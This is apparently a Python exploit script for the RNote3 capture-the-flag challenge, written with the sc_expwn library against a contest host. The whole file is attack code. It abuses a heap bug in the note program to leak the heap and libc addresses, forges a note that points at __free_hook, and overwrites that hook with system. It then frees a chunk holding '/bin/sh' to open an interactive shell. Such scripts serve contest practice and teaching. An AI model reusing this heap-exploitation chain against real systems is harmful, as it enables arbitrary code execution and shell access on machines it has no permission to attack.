#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './RNote3'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'rnote3.2018.teamrois.cn', 'port':7322})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    rn = RNote3(conn)

    rn.add('A', 0x80, 'data')
    rn.add('B', 0x80, 'data')
    rn.add('C', 0x10, 'data')
    rn.delete('A')
    rn.edit('B', 'mod')
    rn.delete('XXXX')

    addr_heap_base = u(rn.view('')) - 0x20
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    rn.delete('C')
    rn.add('0', 0x80, '/bin/sh')

    addr_libc_mainarena = u(rn.view('')) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system    = libc.sep_function['system']
    addr_libc_free_hook = libc.symbols['__free_hook']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
   
    fake_note  = 'hook'.ljust(8, '\x00')
    fake_note += p64(0x100)
    fake_note += p64(addr_libc_free_hook)
    rn.add('1', 0x18, fake_note.rstrip('\x00'))
    rn.edit('hook', p64(addr_libc_system))

    rn.delete('0')

class RNote3:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, title, size, content):
        self.sendline('1')
        self.sendlineafter('title: ', title)
        self.sendlineafter('size: ', str(size))
        self.sendlineafter('content: ', content)

    def view(self, title):
        self.sendline('2')
        self.sendlineafter('title: ', title)
        self.recvuntil('content: ')
        return self.recvuntil('\n', drop=True)

    def edit(self, title, content):
        self.sendline('3')
        self.sendlineafter('title: ', title)
        self.sendlineafter('content: ', content)

    def delete(self, title):
        self.sendline('4')
        self.sendlineafter('title: ', title)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
